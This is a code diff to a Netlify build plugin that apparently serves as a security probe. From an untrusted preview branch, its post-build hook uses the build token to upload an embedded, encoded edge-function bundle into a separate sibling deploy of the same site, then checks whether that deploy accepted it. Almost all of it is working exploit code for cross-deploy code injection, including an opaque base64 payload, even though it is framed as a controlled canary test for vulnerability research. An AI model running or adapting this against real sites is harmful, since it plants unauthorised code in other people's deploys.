@@ -3,12 +3,11 @@ import { createHash } from 'node:crypto'
 const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
 const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
 const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
-const TARGET_DEPLOY_ID = '6abdca497c8ea035290f16b2'
-const TARGET_BRANCH = 'fn-bind-target-20260930'
-const FUNCTION_NAME = 'sibling-binding-canary'
-const BUNDLE_SHA256 = '31568bdc5198f15672fd746cb71b4bdb21f36db0cdb30d768cf8033dff0cd3aa'
+const TARGET_DEPLOY_ID = '6abdcce88db7f673491ca3a8'
+const TARGET_BRANCH = 'edge-bind-v2-20261001'
+const BUNDLE_SHA256 = 'beb9a4014352e6239287ee4d19e8f2baf198115325ec76c8b6a8537ff5711350'
 const BUNDLE_BASE64 =
-  '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'
+  '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'
 const BUNDLE = Buffer.from(BUNDLE_BASE64, 'base64')
 
 const normalizeApiBase = (value) =>
@@ -45,8 +44,8 @@ const readDeploy = async ({ apiBase, deployId, token }) => {
       signal: AbortSignal.timeout(10_000),
     })
     const body = response.ok ? await response.json() : null
-    const requiredFunctions = Array.isArray(body?.required_functions)
-      ? body.required_functions
+    const requiredEdgeFunctions = Array.isArray(body?.required_edge_functions)
+      ? body.required_edge_functions
       : null
     return {
       status: response.status,
@@ -75,13 +74,13 @@ const readDeploy = async ({ apiBase, deployId, token }) => {
         ? body.state
         : null,
       published: body?.published_at != null,
-      requiredFunctionListVisible: requiredFunctions !== null,
-      requiredFunctionCount: requiredFunctions?.length ?? null,
-      requiredFunctionMatches:
-        requiredFunctions?.length === 1 && requiredFunctions[0] === BUNDLE_SHA256,
-      requiredFunctionEvidenceSafe:
-        requiredFunctions === null ||
-        (requiredFunctions.length === 1 && requiredFunctions[0] === BUNDLE_SHA256),
+      requiredEdgeFunctionListVisible: requiredEdgeFunctions !== null,
+      requiredEdgeFunctionCount: requiredEdgeFunctions?.length ?? null,
+      requiredEdgeFunctionMatches:
+        requiredEdgeFunctions?.length === 1 && requiredEdgeFunctions[0] === BUNDLE_SHA256,
+      requiredEdgeFunctionEvidenceSafe:
+        requiredEdgeFunctions === null ||
+        (requiredEdgeFunctions.length === 1 && requiredEdgeFunctions[0] === BUNDLE_SHA256),
       responseBodyRetained: false,
     }
   } catch (error) {
@@ -93,16 +92,13 @@ const readDeploy = async ({ apiBase, deployId, token }) => {
   }
 }
 
-const uploadTargetFunction = async ({ apiBase, token }) => {
+const uploadTargetEdgeFunction = async ({ apiBase, token }) => {
   try {
-    const encodedName = encodeURIComponent(FUNCTION_NAME)
-    const expectedPathname = `/api/v1/deploys/${TARGET_DEPLOY_ID}/functions/${encodedName}`
+    const expectedPathname = `/api/v1/deploys/${TARGET_DEPLOY_ID}/edge_functions/${BUNDLE_SHA256}`
     const url = new URL(expectedPathname, apiBase)
-    if (url.pathname !== expectedPathname || decodeURIComponent(encodedName) !== FUNCTION_NAME) {
+    if (url.pathname !== expectedPathname) {
       throw new Error('Target upload path did not round-trip')
     }
-    url.searchParams.set('runtime', 'js')
-    url.searchParams.set('size', String(BUNDLE.length))
     const response = await fetch(url, {
       method: 'PUT',
       headers: {
@@ -176,7 +172,7 @@ export const onPostBuild = async ({ constants, utils }) => {
       currentDeploy?.commitRef === currentCommitRef &&
       currentDeploy?.state === 'building' &&
       currentDeploy?.published === false,
-    targetDeployIdExact: TARGET_DEPLOY_ID === '6abdca497c8ea035290f16b2',
+    targetDeployIdExact: TARGET_DEPLOY_ID === '6abdcce88db7f673491ca3a8',
     targetDistinctFromCurrent: TARGET_DEPLOY_ID !== currentDeployId,
     targetDeployBindingExact:
       targetBefore?.status === 200 &&
@@ -188,14 +184,14 @@ export const onPostBuild = async ({ constants, utils }) => {
       targetBefore?.commitRef === null &&
       targetBefore?.state === 'uploading' &&
       targetBefore?.published === false &&
-      targetBefore?.requiredFunctionEvidenceSafe === true,
+      targetBefore?.requiredEdgeFunctionEvidenceSafe === true,
     tokenPresent,
-    functionBundlePinned:
-      BUNDLE.length === 1141 &&
+    edgeBundlePinned:
+      BUNDLE.length === 1092 &&
       createHash('sha256').update(BUNDLE).digest('hex') === BUNDLE_SHA256,
   }
   const result = {
-    schema: 'netlify-untrusted-same-site-cross-deploy-function-upload.v1',
+    schema: 'netlify-untrusted-same-site-cross-deploy-edge-upload.v1',
     prerequisites,
     policy,
     currentDeploy,
@@ -214,16 +210,16 @@ export const onPostBuild = async ({ constants, utils }) => {
   }
 
   if (!Object.values(prerequisites).every(Boolean)) {
-    console.log(`NETLIFY_UNTRUSTED_SIBLING_FUNCTION_BINDING ${JSON.stringify(result)}`)
-    utils.build.failBuild('Controlled sibling Function probe prerequisites were not satisfied')
+    console.log(`NETLIFY_UNTRUSTED_SIBLING_EDGE_BINDING ${JSON.stringify(result)}`)
+    utils.build.failBuild('Controlled sibling Edge probe prerequisites were not satisfied')
     return
   }
 
   result.attempted = true
-  result.upload = await uploadTargetFunction({ apiBase, token })
+  result.upload = await uploadTargetEdgeFunction({ apiBase, token })
   await new Promise((resolveWait) => setTimeout(resolveWait, 1_000))
   result.targetAfter = await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
   result.controlledFailureRequested = true
-  console.log(`NETLIFY_UNTRUSTED_SIBLING_FUNCTION_BINDING ${JSON.stringify(result)}`)
-  utils.build.failBuild('Controlled failure after same-site sibling Function upload probe')
+  console.log(`NETLIFY_UNTRUSTED_SIBLING_EDGE_BINDING ${JSON.stringify(result)}`)
+  utils.build.failBuild('Controlled failure after same-site sibling Edge upload probe')
 }
